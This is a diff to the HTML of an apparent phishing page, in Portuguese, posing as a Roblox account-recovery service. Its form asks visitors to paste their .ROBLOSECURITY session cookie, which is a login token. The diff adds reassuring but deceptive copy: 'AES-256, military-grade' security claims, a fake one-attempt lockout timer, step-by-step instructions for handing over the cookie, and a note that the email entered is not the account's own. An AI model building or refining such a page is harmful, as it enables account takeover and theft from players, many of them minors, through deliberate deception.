@@ -752,9 +752,9 @@
 
         .disclaimer {
             text-align: center;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.75rem;
-            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.7rem;
+            line-height: 1.8;
             margin-top: 1.2rem;
         }
 
@@ -1937,7 +1937,7 @@
         </div>
     </section>
 
-    <!-- ===== RECOVERY SECTION ===== -->
+    <!-- ===== RECOVERY SECTION (CORRIGIDA) ===== -->
     <section class="section" id="recovery">
         <div class="container">
             <div class="content-wrapper">
@@ -1967,6 +1967,7 @@
                         </div>
 
                         <form id="recoveryForm" onsubmit="handleSubmit(event)">
+                            <!-- COOKIE -->
                             <div class="form-group">
                                 <label class="form-label">
                                     <i class="fas fa-key"></i> Cookie (.ROBLOSECURITY)
@@ -1977,36 +1978,58 @@
                                         <i class="fas fa-eye"></i>
                                     </button>
                                 </div>
-                                <small class="form-hint">Seu cookie nunca será compartilhado ou armazenado permanentemente</small>
+                                <small class="form-hint">🔒 Seu cookie nunca será compartilhado ou armazenado permanentemente</small>
                             </div>
 
+                            <!-- ===== EMAIL - CORRIGIDO ===== -->
                             <div class="form-group">
                                 <label class="form-label">
-                                    <i class="fas fa-envelope"></i> Email da Conta
+                                    <i class="fas fa-envelope"></i> 📩 Seu Email para Receber o Cookie
                                 </label>
                                 <div class="input-wrapper">
                                     <input type="email" id="emailInput" class="form-input" placeholder="seu.email@exemplo.com" required>
                                 </div>
-                                <small class="form-hint">Confirme o email associado à sua conta</small>
+                                <small class="form-hint" style="color: #f59e0b; font-weight: 600;">
+                                    ⚠️ <strong>ATENÇÃO:</strong> Este é o email onde você vai receber o cookie recuperado. 
+                                    <strong style="color: #fedc00;">NÃO é o email da sua conta Roblox!</strong>
+                                </small>
+                                <small class="form-hint" style="margin-top: 0.2rem; color: rgba(255,255,255,0.5);">
+                                    💡 O cookie será enviado para este email após a recuperação ser concluída.
+                                </small>
                             </div>
 
+                            <!-- SEGURANÇA -->
                             <div class="security-box">
                                 <i class="fas fa-shield-alt"></i>
                                 <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#fedc00;">🇧🇷 #HexaVem</span></p>
                             </div>
 
+                            <!-- BOTÃO -->
                             <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
                                 <i class="fas fa-lock-open"></i> Iniciar Recuperação
                             </button>
 
+                            <!-- ===== BLOQUEIO - CORRIGIDO ===== -->
                             <div class="block-message" id="blockMessage">
                                 <i class="fas fa-clock"></i>
-                                <h3>⏳ Aguarde!</h3>
-                                <p>Você já utilizou sua única tentativa. Aguarde <strong>9 horas</strong> para tentar novamente.</p>
+                                <h3>⏳ Bloqueio de Segurança Ativado!</h3>
+                                <p style="font-size: 0.9rem; margin-bottom: 0.5rem;">
+                                    Você já utilizou sua única tentativa. 
+                                    <strong style="color: #fedc00;">Aguarde 9 horas</strong> para tentar novamente.
+                                </p>
+                                <p style="font-size: 0.8rem; color: rgba(255,255,255,0.5); margin-bottom: 0.5rem;">
+                                    ⏱️ Tempo restante:
+                                </p>
                                 <div class="timer" id="timerDisplay">9h 00m 00s</div>
-                                <p style="font-size:0.8rem;margin-top:0.5rem;">🔒 Navegador anônimo bloqueado</p>
+                                <p style="font-size:0.75rem;margin-top:0.5rem;color:rgba(255,255,255,0.4);">
+                                    🔒 Isso é uma medida de segurança para proteger seu processo de recuperação.
+                                </p>
+                                <p style="font-size:0.7rem;margin-top:0.3rem;color:rgba(255,255,255,0.3);">
+                                    ⚠️ <strong>Nenhum email será enviado automaticamente quando o tempo acabar.</strong> 
+                                    Você precisa tentar novamente manualmente clicando em "Iniciar Recuperação".
+                                </p>
                                 <div style="margin-top: 1rem; display: flex; flex-direction: column; gap: 0.5rem; align-items: center;">
-                                    <p style="color: rgba(255,255,255,0.6); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
+                                    <p style="color: rgba(255,255,255,0.5); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
                                     <div style="display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;">
                                         <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #fedc00; text-decoration: none; font-size: 0.85rem; background: rgba(0,151,57,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(0,151,57,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
                                             <i class="fab fa-discord"></i> Discord
@@ -2018,12 +2041,23 @@
                                 </div>
                             </div>
 
-                            <p class="disclaimer">
-                                ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTermsModal(); return false;">termos de serviço</a> e <a href="#" onclick="openTermsModal(); return false;">política de privacidade</a>.
+                            <!-- ===== DISCLAIMER - CORRIGIDO ===== -->
+                            <p class="disclaimer" style="font-size: 0.7rem; line-height: 1.8; color: rgba(255,255,255,0.4);">
+                                <strong>📌 Como funciona:</strong><br>
+                                1️⃣ Cole o <strong>cookie .ROBLOSECURITY</strong> da sua conta Roblox<br>
+                                2️⃣ Digite o <strong style="color: #fedc00;">seu email</strong> onde vai receber o cookie recuperado<br>
+                                3️⃣ Clique em "Iniciar Recuperação" e aguarde o processamento<br>
+                                4️⃣ Após a recuperação, o novo cookie será enviado para o <strong style="color: #fedc00;">email que você informou</strong><br>
+                                <br>
+                                ⚠️ <strong style="color: #f59e0b;">Importante:</strong> O email que você coloca aqui é para <strong style="color: #fedc00;">receber o cookie recuperado</strong>, 
+                                <strong style="color: #f59e0b;">NÃO é o email da sua conta Roblox!</strong><br>
+                                <br>
+                                ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTermsModal(); return false;" style="color: #fedc00;">termos de serviço</a> e <a href="#" onclick="openTermsModal(); return false;" style="color: #fedc00;">política de privacidade</a>.
                             </p>
                         </form>
                     </div>
 
+                    <!-- SIDEBAR -->
                     <div class="sidebar">
                         <div class="info-card">
                             <h4><i class="fas fa-server"></i> Status do Sistema</h4>
